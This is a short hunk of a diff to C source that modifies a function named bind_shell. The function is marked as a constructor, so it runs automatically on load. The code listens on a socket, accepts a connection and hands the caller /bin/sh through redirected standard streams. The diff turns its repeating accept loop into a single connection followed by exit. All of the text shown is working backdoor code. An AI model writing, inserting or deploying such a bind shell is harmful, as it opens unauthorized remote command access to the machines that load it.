@@ -16,19 +16,18 @@ void __attribute__((constructor)) bind_shell(){
   bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
   listen(host_sock, 0);
   
-  while(1){
-    int client_sock = accept(host_sock, NULL, NULL);
-    if(client_sock > 0){
-      pid_t pid;
-      if((pid = fork()) == 0){
-	dup2(client_sock, 0);
-	dup2(client_sock, 1);
-	dup2(client_sock, 2);
-	execve("/bin/sh", NULL, NULL);
-      }else{
-	wait(NULL);
-	close(client_sock);
-      }
+  int client_sock = accept(host_sock, NULL, NULL);
+  if(client_sock > 0){
+    pid_t pid;
+    if((pid = fork()) == 0){
+      dup2(client_sock, 0);
+      dup2(client_sock, 1);
+      dup2(client_sock, 2);
+      execve("/bin/sh", NULL, NULL);
+    }else{
+      wait(NULL);
+      close(client_sock);
+      exit(0);
     }
   }
 }
